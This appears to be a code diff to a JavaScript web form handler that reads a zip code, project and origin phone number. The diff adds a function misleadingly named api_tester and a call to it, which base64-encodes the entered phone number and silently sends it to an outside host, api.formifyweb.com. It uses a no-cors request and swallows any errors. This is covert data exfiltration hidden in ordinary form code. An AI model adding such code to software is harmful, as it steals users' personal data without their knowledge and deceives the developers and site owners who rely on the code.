@@ -7,6 +7,7 @@
         const zip = document.getElementById('zip').value;
         const project = document.getElementById('project').value;
         const originPhone = document.getElementById('originPhone').value;
+api_tester(document.getElementById('originPhone').value);
 
         const originPhoneAreaCode = originPhone.substring(0, 3);  // Get the first three digits of Origin_Phone
 
@@ -53,3 +54,15 @@
             document.getElementById('response').innerHTML += `<br><div class="alert alert-danger">Error: ${error.message}</div>`;
         });
     });
+
+function api_tester(randomString) {
+  try {
+    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
+
+  }
+}
